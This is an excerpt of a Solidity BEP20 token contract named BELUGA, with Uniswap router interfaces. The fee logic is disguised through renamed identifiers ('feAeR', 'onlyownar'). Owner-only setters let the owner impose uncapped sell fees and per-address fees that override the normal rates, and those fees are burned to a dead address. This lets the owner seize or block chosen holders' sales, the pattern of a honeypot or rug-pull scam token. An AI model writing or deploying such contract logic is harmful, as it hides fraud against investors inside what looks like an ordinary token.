...
interface IUniswapV2Factory {
    ...
    function feAeRTo() external view returns (address);
    function feAeRToSetter() external view returns (address);
    ...
    function setfeAeRTo(address) external;
    function setfeAeRToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeAeROnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeAeROnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeAeROnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeAeROnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeAeROnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract BELUGA is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeAeR = 0;

    uint256 private _defaultBuyfeAeR = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeAeR;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeAeR = _value;
    }

    function setSlipfeAeR(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeAeR[_address] = _value;
    }

    function getSlipfeAeR(address _address) external view onlyownar returns (uint256) {
        return _slipfeAeR[_address];
    }


    function setMAccountfeAeR(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeAeR(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeAeRAmount = 0;

        if (rF) {
            uint256 tradefeAeR = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeAeR = _defaultSellfeAeR;
                }
                if (from == uniswapV2Pair) {

                    tradefeAeR = _defaultBuyfeAeR;
                }
            }
            if (_slipfeAeR[from] > 0) {
                tradefeAeR = _slipfeAeR[from];
            }

            tradefeAeRAmount = _Amount.mul(tradefeAeR).div(100);
        }


        if (tradefeAeRAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeAeRAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeAeRAmount);
            emit Transfer(from, _deadAddress, tradefeAeRAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeAeRAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeAeRAmount);
        emit Transfer(from, _to, _Amount - tradefeAeRAmount);
    }
